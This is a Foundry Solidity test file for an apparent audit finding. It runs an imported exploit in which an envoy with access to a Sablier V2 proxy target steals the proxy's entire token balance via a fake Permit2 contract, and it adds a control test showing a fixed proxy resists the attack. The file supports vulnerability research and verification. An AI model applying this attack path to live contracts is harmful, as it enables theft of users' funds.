// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {Exploit} from "./54671-any-envoy-with-access-to-sablierv2proxytarget-can-steal-all.sol";

contract SablierEnvoyDrainTest is Test {
    function test_exploit_envoyDrainsProxyBalance() public {
        Exploit e = new Exploit();
        e.run();

        console.log("proxy balance before", e.proxyBefore());
        console.log("stranger opened", e.strangerOpened() ? 1 : 0);
        console.log("attacker received", e.attackerAfter());
        console.log("proxy balance after", e.proxyAfter());

        assertEq(e.proxyBefore(), 1000 ether, "proxy funding");
        assertFalse(e.strangerOpened(), "stranger passed as envoy");
        assertFalse(e.proxy().isEnvoy(address(e.stranger())), "stranger flag");
        assertTrue(e.proxy().isEnvoy(address(e.envoy())), "envoy flag");
        assertEq(e.attackerAfter(), 1000 ether, "attacker balance");
        assertEq(e.attackerAfter(), e.proxyBefore(), "stole the full proxy balance");
        assertEq(e.proxyAfter(), 0, "proxy leftover");
        assertEq(e.token().balanceOf(address(this)), 1000 ether, "EOA received the tokens");
        assertTrue(address(this) != address(e.owner()), "caller is owner");
    }

    function test_control_canonicalPermit2RejectsTheDummy() public {
        Exploit e = new Exploit();
        e.token().mint(address(e.fixedProxy()), 1000 ether);

        bool drained;
        try e.envoy().stealFixed(
            e.fixedProxy(), e.fakePermit2(), e.sablier(), e.token(), uint160(1000 ether), address(this)
        ) {
            drained = true;
        } catch {}

        assertFalse(drained, "fake permit2 was accepted");
        assertEq(e.token().balanceOf(address(e.fixedProxy())), 1000 ether, "fixed proxy was drained");
        assertEq(e.token().balanceOf(address(this)), 0, "control paid the attacker");
        assertEq(e.token().allowance(address(e.fixedProxy()), address(e.sablier())), 0, "approval left behind");
    }
}
